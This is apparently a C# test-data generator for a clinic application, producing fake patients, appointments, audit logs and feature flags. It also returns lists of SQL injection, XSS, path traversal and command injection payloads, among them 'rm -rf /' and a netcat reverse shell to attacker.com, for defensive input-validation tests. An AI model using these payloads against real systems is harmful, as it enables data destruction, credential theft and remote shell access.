using Bogus;
using XenonClinic.Core.Entities;

namespace XenonClinic.Tests.Helpers;

/// <summary>
/// Generates fake test data using Bogus library
/// </summary>
public static class TestDataGenerator
{
    private static readonly Faker Faker = new();

    public static Patient GeneratePatient(int? tenantId = null, int? companyId = null)
    {
        return new Faker<Patient>()
            .RuleFor(p => p.FirstName, f => f.Name.FirstName())
            .RuleFor(p => p.LastName, f => f.Name.LastName())
            .RuleFor(p => p.Email, f => f.Internet.Email())
            .RuleFor(p => p.PhoneNumber, f => f.Phone.PhoneNumber())
            .RuleFor(p => p.DateOfBirth, f => f.Date.Past(80, DateTime.Now.AddYears(-1)))
            .RuleFor(p => p.Gender, f => f.PickRandom("Male", "Female"))
            .RuleFor(p => p.Address, f => f.Address.FullAddress())
            .RuleFor(p => p.MedicalRecordNumber, f => $"MRN-{f.Random.Number(100000, 999999)}")
            .RuleFor(p => p.TenantId, f => tenantId ?? f.Random.Number(1, 10))
            .RuleFor(p => p.CompanyId, f => companyId ?? f.Random.Number(1, 5))
            .RuleFor(p => p.CreatedAt, f => f.Date.Past(1))
            .RuleFor(p => p.IsActive, true)
            .Generate();
    }

    public static List<Patient> GeneratePatients(int count, int? tenantId = null, int? companyId = null)
    {
        return Enumerable.Range(0, count)
            .Select(_ => GeneratePatient(tenantId, companyId))
            .ToList();
    }

    public static Appointment GenerateAppointment(int patientId, int? tenantId = null, int? companyId = null)
    {
        return new Faker<Appointment>()
            .RuleFor(a => a.PatientId, patientId)
            .RuleFor(a => a.AppointmentDate, f => f.Date.Future(30))
            .RuleFor(a => a.DurationMinutes, f => f.PickRandom(15, 30, 45, 60))
            .RuleFor(a => a.Status, f => f.PickRandom("Scheduled", "Confirmed", "Completed", "Cancelled"))
            .RuleFor(a => a.Notes, f => f.Lorem.Sentence())
            .RuleFor(a => a.TenantId, f => tenantId ?? f.Random.Number(1, 10))
            .RuleFor(a => a.CompanyId, f => companyId ?? f.Random.Number(1, 5))
            .RuleFor(a => a.CreatedAt, f => f.Date.Past(1))
            .Generate();
    }

    public static AuditLog GenerateAuditLog(string? userId = null, string? action = null)
    {
        return new Faker<AuditLog>()
            .RuleFor(a => a.UserId, f => userId ?? f.Random.Guid().ToString())
            .RuleFor(a => a.UserName, f => f.Internet.UserName())
            .RuleFor(a => a.Action, f => action ?? f.PickRandom("Create", "Update", "Delete", "Read"))
            .RuleFor(a => a.EntityType, f => f.PickRandom("Patient", "Appointment", "User", "LabOrder"))
            .RuleFor(a => a.EntityId, f => f.Random.Number(1, 1000).ToString())
            .RuleFor(a => a.OldValues, f => f.Random.Bool() ? "{\"field\": \"oldValue\"}" : null)
            .RuleFor(a => a.NewValues, f => "{\"field\": \"newValue\"}")
            .RuleFor(a => a.IpAddress, f => f.Internet.Ip())
            .RuleFor(a => a.UserAgent, f => f.Internet.UserAgent())
            .RuleFor(a => a.CorrelationId, f => Guid.NewGuid().ToString())
            .RuleFor(a => a.Timestamp, f => f.Date.Recent(30))
            .RuleFor(a => a.TenantId, f => f.Random.Number(1, 10))
            .RuleFor(a => a.CompanyId, f => f.Random.Number(1, 5))
            .Generate();
    }

    public static FeatureFlag GenerateFeatureFlag(string? name = null, bool? isEnabled = null)
    {
        return new Faker<FeatureFlag>()
            .RuleFor(f => f.Name, fa => name ?? fa.Lorem.Word().ToUpper() + "_FEATURE")
            .RuleFor(f => f.Description, fa => fa.Lorem.Sentence())
            .RuleFor(f => f.IsEnabled, fa => isEnabled ?? fa.Random.Bool())
            .RuleFor(f => f.RolloutPercentage, fa => fa.Random.Number(0, 100))
            .RuleFor(f => f.EnabledForUserIds, "")
            .RuleFor(f => f.EnabledForRoles, "")
            .RuleFor(f => f.CreatedAt, fa => fa.Date.Past(1))
            .RuleFor(f => f.UpdatedAt, fa => fa.Date.Recent(30))
            .Generate();
    }

    public static string GenerateSqlInjectionPayload()
    {
        return Faker.PickRandom(
            "'; DROP TABLE Users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM Users--",
            "1; DELETE FROM patients WHERE 1=1;--",
            "' OR 1=1 --",
            "admin' OR '1'='1'/*",
            "1' AND (SELECT COUNT(*) FROM Users) > 0 --"
        );
    }

    public static string GenerateXssPayload()
    {
        return Faker.PickRandom(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"\" onerror=\"alert('XSS')\">",
            "<div style=\"background:url('javascript:alert(1)')\">",
            "onclick=alert('XSS')"
        );
    }

    public static string GeneratePathTraversalPayload()
    {
        return Faker.PickRandom(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc/passwd",
            "/etc/passwd%00.jpg",
            "....\\....\\....\\windows\\win.ini"
        );
    }

    public static string GenerateCommandInjectionPayload()
    {
        return Faker.PickRandom(
            "; cat /etc/passwd",
            "| ls -la",
            "& whoami",
            "`id`",
            "$(cat /etc/passwd)",
            "; rm -rf /",
            "| nc -e /bin/sh attacker.com 4444"
        );
    }

    public static string GenerateValidJwtToken()
    {
        // This is a mock token for testing purposes only
        return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
    }

    public static string GenerateMalformedJwtToken()
    {
        return Faker.PickRandom(
            "not.a.token",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0",
            "",
            "null",
            "undefined"
        );
    }
}
